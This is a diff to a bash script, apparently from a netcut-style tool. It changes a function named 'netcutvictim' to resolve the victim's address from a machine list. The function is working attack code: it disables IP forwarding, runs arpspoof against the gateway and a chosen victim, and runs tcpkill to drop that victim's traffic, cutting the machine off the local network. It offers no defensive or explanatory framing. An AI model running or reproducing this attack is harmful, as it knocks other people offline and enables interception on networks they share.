@@ -121,13 +121,19 @@ function disable_protection() {
 function netcutvictim() {
 	local gw=$1
 	local victim=$2
-	verbose_print "run_as_root arpspoof -t $gw $victim" "$fg_green"
-	verbose_print "run_as_root tcpkill -i ${iface-} -3 net $victim" "$fg_green"
+	local machine_data
+	machine_data=$(select_machine true "$victim")
+	local a
+	# shellcheck disable=SC2001
+	a=($(echo "$machine_data" | sed 's/|/\n/g'))
+
+	verbose_print "run_as_root arpspoof -t $gw ${a[1]}" "$fg_green"
+	verbose_print "run_as_root tcpkill -i ${iface-} -3 net ${a[1]}" "$fg_green"
 
 	run_as_root sysctl -w net.ipv4.ip_forward=0 &>/dev/null
-	run_as_root arpspoof -t "$gw" "$victim" &>/dev/null &
+	run_as_root arpspoof -t "$gw" "${a[1]}" &>/dev/null &
 	local arpspoof_pid=$!
-	run_as_root tcpkill -i "${iface-}" -3 net "$victim" &>/dev/null &
+	run_as_root tcpkill -i "${iface-}" -3 net "${a[1]}" &>/dev/null &
 	local tcpkill_pid=$!
 	update_pid_machine_list "$arpspoof_pid" "$tcpkill_pid" "$victim" 1
 }
